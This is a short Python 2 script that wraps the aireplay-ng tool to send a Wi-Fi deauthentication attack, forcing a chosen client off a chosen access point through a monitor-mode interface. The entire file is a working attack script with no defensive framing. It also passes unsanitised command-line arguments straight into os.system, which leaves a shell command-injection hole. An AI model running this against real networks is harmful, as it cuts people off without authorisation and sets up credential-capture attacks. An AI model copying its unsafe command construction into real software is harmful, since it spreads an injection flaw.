#!/usr/bin/env python

import sys, os

def main():
  if len(sys.argv) < 3:
    print "Usage: deauth [ap_mac] [client_mac]"
  else:
    ap_mac = sys.argv[1]
    client_mac = sys.argv[2]
    os.system("aireplay-ng -0 1 -a "+ap_mac+" -c "+client_mac+" wlan1mon")

if __name__ == "__main__":
  main()
